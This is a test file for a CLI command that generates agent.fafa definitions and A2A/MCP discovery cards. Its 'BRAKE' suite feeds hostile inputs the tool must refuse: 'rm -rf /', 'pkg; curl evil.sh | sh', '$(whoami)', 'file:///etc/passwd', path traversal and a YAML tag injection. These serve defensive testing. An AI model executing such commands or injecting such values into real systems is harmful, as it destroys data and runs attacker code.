import { describe, test, expect, beforeEach, afterEach, spyOn } from 'bun:test';
import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'fs';
import { createRequire } from 'module';
import { tmpdir } from 'os';
import { dirname, join } from 'path';
import { parse as parseYaml } from 'yaml';
import Ajv2020 from 'ajv/dist/2020.js';
import {
  cardInitCommand,
  parseSkill,
  shortNameFrom,
  type Ask,
  type CardInitOptions,
} from '../../src/commands/card.js';
import { cardsCommand } from '../../src/commands/cards.js';

const require = createRequire(import.meta.url);
const specDir = dirname(require.resolve('@faf/specification/package.json'));
const fafaSchema = JSON.parse(readFileSync(join(specDir, 'schemas', 'fafa.schema.json'), 'utf8'));
const validateFafa = new Ajv2020({ strict: false, allErrors: true }).compile(fafaSchema);

/** The Pack of Cards post's example, as flags. */
const WEATHER: CardInitOptions = {
  name: 'Weather Agent',
  domain: 'example.com',
  description: 'Answers questions about the weather anywhere.',
  setVersion: '1.2.0',
  url: 'https://example.com/a2a',
  skill: ['Get forecast: A three-day forecast for a place.'],
  example: ['Will it rain in Leeds tomorrow?', 'What is the forecast for Tokyo this weekend?'],
};

/** Answers in order, as a person would type them. */
function scripted(lines: string[]): { ask: Ask; asked: string[] } {
  const asked: string[] = [];
  const queue = [...lines];
  return {
    asked,
    ask: async (q) => {
      asked.push(q);
      return queue.shift() ?? '';
    },
  };
}

async function expectExit(code: number, fn: () => Promise<void>): Promise<string> {
  const errors: string[] = [];
  const exitSpy = spyOn(process, 'exit').mockImplementation(((c?: number) => {
    throw new Error(`__exit_${c}__`);
  }) as never);
  const errSpy = spyOn(console, 'error').mockImplementation((m: unknown) => {
    errors.push(String(m));
  });
  try {
    await fn();
    throw new Error('expected process.exit');
  } catch (e: unknown) {
    expect(e instanceof Error ? e.message : String(e)).toContain(`__exit_${code}__`);
  } finally {
    exitSpy.mockRestore();
    errSpy.mockRestore();
  }
  return errors.join('\n');
}

describe('TYRE: faf card init', () => {
  let dir: string;
  let logSpy: ReturnType<typeof spyOn>;

  beforeEach(() => {
    dir = join(tmpdir(), `faf-card-init-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    mkdirSync(dir, { recursive: true });
    logSpy = spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    logSpy.mockRestore();
    rmSync(dir, { recursive: true, force: true });
  });

  test('flags alone write a schema-valid agent.fafa with the seven answers', async () => {
    await cardInitCommand({ ...WEATHER, dir });
    const text = readFileSync(join(dir, 'agent.fafa'), 'utf-8');
    const doc = parseYaml(text);
    expect(validateFafa(doc)).toBe(true);
    expect(doc.agent.name).toBe('weather-agent');
    expect(doc.agent.displayName).toBe('Weather Agent');
    expect(doc.agent.id).toBe('urn:air:example.com:agent:weather-agent');
    expect(doc.agent.version).toBe('1.2.0');
    expect(doc.capabilities[0].name).toBe('Get forecast');
    expect(doc.capabilities[0].description).toBe('A three-day forecast for a place.');
    expect(doc.endpoints).toEqual([{ protocol: 'a2a', transport: 'http', location: 'https://example.com/a2a' }]);
    expect(doc.metadata.cards.examples).toHaveLength(2);
  });

  test('a file people keep: no YAML anchors or aliases', async () => {
    await cardInitCommand({ ...WEATHER, dir });
    expect(readFileSync(join(dir, 'agent.fafa'), 'utf-8')).not.toMatch(/[&*]a\d/);
  });

  test('beside a project.faf, faf cards writes the catalog and ARD from it', async () => {
    writeFileSync(join(dir, 'project.faf'), readFileSync(join(import.meta.dir, '../fixtures/cards/project.faf'), 'utf-8'));
    await cardInitCommand({ ...WEATHER, dir });
    const errSpy = spyOn(console, 'error').mockImplementation(() => {});
    try {
      cardsCommand({ dir, target: 'catalog,ard' });
    } finally {
      errSpy.mockRestore();
    }
    const read = (file: string) => readFileSync(join(dir, '.well-known', file), 'utf-8');
    expect(read('ai-catalog.json')).toContain('urn:air:example.com:a2a:weather-agent');
    // The example questions are ARD's representativeQueries; the catalog has no place for them.
    const ard = JSON.parse(read('ard.json'));
    expect(ard.entries[0].identifier).toBe('urn:air:example.com:a2a:weather-agent');
    expect(ard.entries[0].representativeQueries).toEqual(WEATHER.example);
  });

  test('asked interactively, the same answers write the same file', async () => {
    await cardInitCommand({ ...WEATHER, dir, out: 'from-flags.fafa' });
    const { ask, asked } = scripted([
      'Weather Agent', // name
      '', // short name: accept the default
      'example.com', // domain
      'Answers questions about the weather anywhere.', // what it does
      '1.2.0', // version
      'https://example.com/a2a', // where it runs
      '', // protocol: accept a2a
      'Get forecast', // what it can do
      'A three-day forecast for a place.',
      '', // no more capabilities
      'Will it rain in Leeds tomorrow?',
      'What is the forecast for Tokyo this weekend?',
      '', // no more questions
      '', // write the catalog and ARD now: accept yes
    ]);
    const errSpy = spyOn(console, 'error').mockImplementation(() => {});
    try {
      await cardInitCommand({ dir }, ask);
    } finally {
      errSpy.mockRestore();
    }
    expect(asked.length).toBe(14);
    // Good, in one command: the agent.fafa, then the catalog and ARD from it.
    expect(existsSync(join(dir, '.well-known', 'ai-catalog.json'))).toBe(true);
    expect(existsSync(join(dir, '.well-known', 'ard.json'))).toBe(true);
    const fromFlags = parseYaml(readFileSync(join(dir, 'from-flags.fafa'), 'utf-8'));
    const fromQuestions = parseYaml(readFileSync(join(dir, 'agent.fafa'), 'utf-8'));
    expect(fromQuestions).toEqual(fromFlags);
  });

  test('flags that cover everything ask nothing', async () => {
    const { ask, asked } = scripted([]);
    await cardInitCommand({ ...WEATHER, dir }, ask);
    expect(asked).toHaveLength(0);
  });

  test('an npm package is where an MCP server runs (stdio)', async () => {
    await cardInitCommand({ ...WEATHER, url: undefined, package: 'weather-mcp', dir });
    const doc = parseYaml(readFileSync(join(dir, 'agent.fafa'), 'utf-8'));
    expect(validateFafa(doc)).toBe(true);
    expect(doc.endpoints).toEqual([{ protocol: 'mcp', transport: 'stdio', location: 'weather-mcp' }]);
  });

  test('an npm package, offer taken: catalog and ARD, and no registry step without a server.json', async () => {
    const { ask } = scripted(['1.2.0', '']); // version asked, then the offer taken
    await cardInitCommand({ ...WEATHER, url: undefined, package: 'weather-mcp', setVersion: undefined, dir }, ask);
    expect(existsSync(join(dir, '.well-known', 'ai-catalog.json'))).toBe(true);
    expect(existsSync(join(dir, '.well-known', 'ard.json'))).toBe(true);
    expect(existsSync(join(dir, 'server.json'))).toBe(false);
  });

  test('the version defaults to package.json when asked', async () => {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ version: '3.4.5' }));
    const { ask } = scripted(['']); // accept the default version
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir }, ask);
    expect(parseYaml(readFileSync(join(dir, 'agent.fafa'), 'utf-8')).agent.version).toBe('3.4.5');
  });

  test('an existing agent.fafa is never replaced without --force', async () => {
    writeFileSync(join(dir, 'agent.fafa'), 'mine\n');
    const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, dir }));
    expect(err).toContain('already exists');
    expect(readFileSync(join(dir, 'agent.fafa'), 'utf-8')).toBe('mine\n');
    await cardInitCommand({ ...WEATHER, dir, force: true });
    expect(readFileSync(join(dir, 'agent.fafa'), 'utf-8')).toContain('weather-agent');
  });

  test('a missing answer names itself and writes nothing', async () => {
    const { ask } = scripted(['']); // no domain given
    const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, domain: undefined, dir }, ask));
    expect(err).toContain('Domain');
    expect(existsSync(join(dir, 'agent.fafa'))).toBe(false);
  });

  test('no capability is a missing answer, not an empty card', async () => {
    const { ask } = scripted(['']); // no capability given
    const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, skill: undefined, dir }, ask));
    expect(err).toContain('what it can do');
    expect(existsSync(join(dir, 'agent.fafa'))).toBe(false);
  });

  test('from flags: names the next step, and the BEST one when there is no project.faf', async () => {
    const lines: string[] = [];
    logSpy.mockImplementation((m: unknown) => {
      lines.push(String(m));
    });
    await cardInitCommand({ ...WEATHER, dir });
    const said = lines.join('\n');
    expect(said).toContain('next: faf cards --target a2a,catalog,ard');
    expect(said).toContain('BEST: add your project.faf (faf init)');
    expect(existsSync(join(dir, '.well-known'))).toBe(false); // flags never write more than asked
  });

  test('declining the offer writes only the agent.fafa', async () => {
    const { ask } = scripted(['1.2.0', 'n']); // version asked, then the offer declined
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir }, ask);
    expect(existsSync(join(dir, 'agent.fafa'))).toBe(true);
    expect(existsSync(join(dir, '.well-known'))).toBe(false);
  });

  test('short names and skills parse as people type them', () => {
    expect(shortNameFrom('Weather Agent')).toBe('weather-agent');
    expect(shortNameFrom('  My Agent! v2 ')).toBe('my-agent-v2');
    expect(parseSkill('Get forecast: A three-day forecast')).toEqual({ name: 'Get forecast', description: 'A three-day forecast' });
    expect(parseSkill('Get forecast')).toEqual({ name: 'Get forecast' });
  });
});

/** A fresh folder per test, console.log quiet; `said` collects what was printed. */
function freshDir(tag: string): { dir: () => string; said: () => string } {
  let d = '';
  let lines: string[] = [];
  let logSpy: ReturnType<typeof spyOn>;
  beforeEach(() => {
    d = join(tmpdir(), `faf-card-${tag}-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    mkdirSync(d, { recursive: true });
    lines = [];
    logSpy = spyOn(console, 'log').mockImplementation((m: unknown) => {
      lines.push(String(m));
    });
  });
  afterEach(() => {
    logSpy.mockRestore();
    rmSync(d, { recursive: true, force: true });
  });
  return { dir: () => d, said: () => lines.join('\n').replace(/\x1b\[[0-9;]*m/g, '') };
}

/** Every file under `dir`, relative. */
function filesIn(dir: string): string[] {
  const out: string[] = [];
  const walk = (rel: string) => {
    for (const name of readdirSync(join(dir, rel))) {
      const r = rel ? `${rel}/${name}` : name;
      if (statSync(join(dir, r)).isDirectory()) {walk(r);} else {out.push(r);}
    }
  };
  walk('');
  return out.sort();
}

describe('BRAKE: faf card init — refuses what it must not write', () => {
  const t = freshDir('brake');

  for (const url of ['javascript:alert(1)', 'ftp://example.com/x', 'file:///etc/passwd', 'data:text/plain,hi']) {
    test(`--url ${url}: not an http(s) URL — refused, nothing written`, async () => {
      const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, url, dir: t.dir() }));
      expect(err).toContain('http(s)');
      expect(filesIn(t.dir())).toEqual([]);
    });
  }

  for (const pkg of ['rm -rf /', 'pkg; curl evil.sh | sh', '$(whoami)', 'UPPER-Case', '../escape']) {
    test(`--package ${JSON.stringify(pkg)}: not an npm package name — refused, nothing written`, async () => {
      const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, url: undefined, package: pkg, dir: t.dir() }));
      expect(err).toContain('npm package name');
      expect(filesIn(t.dir())).toEqual([]);
    });
  }

  test('--protocol other than a2a or mcp — refused, nothing written', async () => {
    const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, protocol: 'grpc', dir: t.dir() }));
    expect(err).toContain('a2a or mcp');
    expect(filesIn(t.dir())).toEqual([]);
  });

  test('--out outside the folder — refused, nothing written there', async () => {
    const outside = join(tmpdir(), `faf-card-escape-${Date.now()}.fafa`);
    await expect(cardInitCommand({ ...WEATHER, dir: t.dir(), out: `../${outside.split('/').pop()}` })).rejects.toThrow(/outside/);
    expect(existsSync(outside)).toBe(false);
  });

  test('an existing agent.fafa is left byte for byte without --force', async () => {
    writeFileSync(join(t.dir(), 'agent.fafa'), 'mine\n');
    await expectExit(2, () => cardInitCommand({ ...WEATHER, dir: t.dir() }));
    expect(readFileSync(join(t.dir(), 'agent.fafa'), 'utf-8')).toBe('mine\n');
  });

  test('YAML in an answer stays one string: no injected keys, no tags, no anchors', async () => {
    const description = 'x\nagent:\n  name: pwned\n!!js/function "f(){}"';
    await cardInitCommand({ ...WEATHER, name: '&a *a: [x] # y', description, dir: t.dir() });
    const text = readFileSync(join(t.dir(), 'agent.fafa'), 'utf-8');
    const doc = parseYaml(text);
    expect(doc.agent.description).toBe(description);
    expect(doc.agent.displayName).toBe('&a *a: [x] # y');
    expect(doc.agent.name).toBe('a-a-x-y');
    expect(Object.keys(doc)).toEqual(['version', 'agent', 'capabilities', 'endpoints', 'metadata']);
    expect(validateFafa(doc)).toBe(true);
  });
});

describe('ENGINE: faf card init — the cards ladder (BETTER is .fafa, BEST is project.faf)', () => {
  const t = freshDir('engine');
  const take = () => scripted(['1.2.0', '']).ask; // version asked, offer taken
  const card = (f: string) => readFileSync(join(t.dir(), f), 'utf-8');

  test('A2A agent, offer taken: agent.fafa + plain A2A card, catalog, ARD — no FAF context', async () => {
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir: t.dir() }, take());
    expect(filesIn(t.dir())).toEqual(['.well-known/agent-card.json', '.well-known/ai-catalog.json', '.well-known/ard.json', 'agent.fafa']);
    for (const f of ['.well-known/agent-card.json', '.well-known/ai-catalog.json', '.well-known/ard.json']) {
      expect(card(f)).not.toContain('project.faf');
      expect(card(f)).not.toContain('faf.one/ext');
    }
    expect(JSON.parse(card('.well-known/agent-card.json')).capabilities.extensions).toEqual([]);
  });

  test('the catalog lists the .fafa — the source that makes these cards BETTER', async () => {
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir: t.dir() }, take());
    expect(card('.well-known/ai-catalog.json')).toContain('application/vnd.fafa+yaml');
  });

  test('hosted MCP agent, offer taken: a plain Server Card from the .fafa', async () => {
    await cardInitCommand({ ...WEATHER, setVersion: undefined, url: 'https://mcp.example.com/mcp', protocol: 'mcp', dir: t.dir() }, take());
    const sc = JSON.parse(card('server-card'));
    expect(sc.name).toBe('com.example/weather-agent');
    expect(sc.remotes).toEqual([{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }]);
    expect(sc._meta?.['one.faf/context']).toBeUndefined();
    expect(existsSync(join(t.dir(), '.well-known', 'agent-card.json'))).toBe(false);
  });

  test('beside a project.faf (BEST): the same cards, the A2A card with FAF context, identity unchanged', async () => {
    writeFileSync(join(t.dir(), 'project.faf'), 'project:\n  name: other-name\n  goal: Another goal\n');
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir: t.dir() }, take());
    const a2a = JSON.parse(card('.well-known/agent-card.json'));
    expect(a2a.name).toBe('Weather Agent');
    expect(a2a.capabilities.extensions.map((e: { uri: string }) => e.uri)).toEqual(['https://faf.one/ext/context/v1']);
    expect(existsSync(join(t.dir(), 'server-card'))).toBe(false); // the offer is the BETTER set, never wider
  });
});

describe('AERO: faf card init — words and edges', () => {
  const t = freshDir('aero');

  for (const name of ['🏎️🏎️', 'وكيل الطقس']) {
    test(`a name with no usable short name (${name}) names the short-name rule`, async () => {
      const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, name, dir: t.dir() }));
      expect(err).toContain('Short name');
      expect(filesIn(t.dir())).toEqual([]);
    });
  }

  test('the ladder words: BEST is named, Good never is', async () => {
    await cardInitCommand({ ...WEATHER, dir: t.dir() });
    expect(t.said()).toContain('BEST: add your project.faf (faf init)');
    expect(t.said()).not.toMatch(/\bGood\b/);
    expect(t.said()).not.toMatch(/\bbetter:/);
  });

  for (const [kind, opts, next] of [
    ['A2A URL', {}, 'a2a,catalog,ard'],
    ['MCP URL', { url: 'https://mcp.example.com/mcp', protocol: 'mcp' }, 'mcp,catalog,ard'],
    ['npm package', { url: undefined, package: 'weather-mcp' }, 'catalog,ard'],
  ] as const) {
    test(`next: names exactly the BETTER cards for an ${kind}`, async () => {
      await cardInitCommand({ ...WEATHER, ...opts, dir: t.dir() });
      expect(t.said()).toContain(`next: faf cards --target ${next}`);
    });
  }
});

describe('PIT: faf card init — clean refusals, safe re-runs', () => {
  const t = freshDir('pit');

  test('a refused run leaves the folder as it found it', async () => {
    await expectExit(2, () => cardInitCommand({ ...WEATHER, skill: [], dir: t.dir() }));
    expect(filesIn(t.dir())).toEqual([]);
  });

  test('--force replaces the agent.fafa; running the cards again changes nothing', async () => {
    writeFileSync(join(t.dir(), 'agent.fafa'), 'old\n');
    await cardInitCommand({ ...WEATHER, setVersion: undefined, dir: t.dir(), force: true }, scripted(['1.2.0', '']).ask);
    expect(readFileSync(join(t.dir(), 'agent.fafa'), 'utf-8')).toContain('Weather Agent');
    const errs: string[] = [];
    const errSpy = spyOn(console, 'error').mockImplementation((m: unknown) => {
      errs.push(String(m));
    });
    cardsCommand({ dir: t.dir(), target: 'a2a,catalog,ard' });
    errSpy.mockRestore();
    expect(errs.filter((l) => l.includes('✓')).every((l) => l.includes('unchanged'))).toBe(true);
  });
});
